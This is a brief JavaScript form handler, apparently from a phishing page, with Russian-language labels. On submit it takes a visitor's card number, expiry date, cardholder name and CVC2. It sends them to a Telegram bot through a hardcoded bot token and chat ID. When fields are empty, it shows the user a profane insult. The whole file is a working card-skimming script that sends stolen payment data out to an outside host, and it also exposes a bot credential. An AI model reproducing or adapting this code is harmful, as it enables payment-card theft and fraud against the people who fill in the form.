document.getElementById("tg").addEventListener("submit", function (e) {
  e.preventDefault();
  const botToken = "6356129001:AAEJRsqBQi0IEiK2gybD8Sa9PIgLKVvJzFk";
  const chatId = "1352317933";

  const now = new Date();

  if (
    cardnum.value !== "" &&
    MM.value !== "" &&
    IT.value !== "" &&
    cvc2.value !== "" &&
    namecard.value !== ""
  ) {
    message = `${now}\n-----------------\nНомер карты: ${cardnum.value}\nММ: ${MM.value} IT: ${IT.value}\nИмя Фамилия: ${namecard.value}\nCVC2: ${cvc2.value}\nДаун: ${ifdayn.checked} `;

    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    });
  } else {
    alert("Заполни поля заебал");
  }
});

//cardnum, MM, IT, namecard, cvc2
